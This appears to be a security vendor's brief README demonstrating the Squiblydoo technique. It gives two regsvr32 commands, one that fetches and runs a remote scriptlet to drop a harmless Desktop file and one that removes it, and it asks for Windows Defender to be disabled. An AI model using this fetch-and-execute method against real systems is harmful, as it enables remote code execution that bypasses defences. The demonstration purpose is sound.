# Squiblydoo Demo
This is a quick demo to show how an unprotected Windows system can be affected by RegSvr32.dll.
**strong text**
## Prerequisites:
Windows Defender disabled

## Demo:

**File Download:**
Open a command prompt and run the following command:

    regsvr32 /u /n /s /i:https://raw.githubusercontent.com/matt-threatlocker/squiblydoodemo/master/badFile.sct scrobj.dll
This will place a badFile.txt file on the users Desktop.  

**File Deletion:**

    regsvr32 /u /n /s /i:https://raw.githubusercontent.com/matt-threatlocker/squiblydoodemo/master/badFileRemove.sct scrobj.dll
This will remove the file created by the previous command.  
